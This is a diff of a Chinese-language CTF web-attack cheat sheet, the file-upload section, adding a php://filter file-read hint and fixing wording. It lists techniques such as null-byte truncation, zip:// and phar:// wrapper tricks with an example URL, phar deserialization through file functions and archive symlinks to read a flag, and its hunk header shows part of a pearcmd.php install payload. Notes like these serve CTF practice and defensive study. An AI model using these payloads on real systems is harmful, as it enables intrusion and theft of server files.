@@ -47,11 +47,12 @@ index.php?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://xi
 
 # 文件上传
 
+- `$_GET['xxx']`, 都可以用 filter 这类读文件尝试
 - %00 截断 php 版本小于 5.3.4
 - 上传为zip为 pic.jpg, zip://读取 url: `http://xxx//index.php?url=zip:///app/upload/pic.jpg%23basic.php` ,需要将#编码为%23
 - 上传为zip用phar去读
 - 上传时和文件相关都可能是 phar 反序列化,如 `file_exists($filename)` 考虑 phar 反序列化 `phar://abc.phar.gif/test.txt`
-  - 能进行攻击的远不至于 file_get_contents，所有的文件函数都会导致这个问题
+  - 能进行攻击的不只有 file_get_contents，所有的文件函数都会导致这个问题
 - 压缩包软链接，传到/tmp/data 下, ，这个软链接指向 flag，即可获取 flag
 
 ```sh
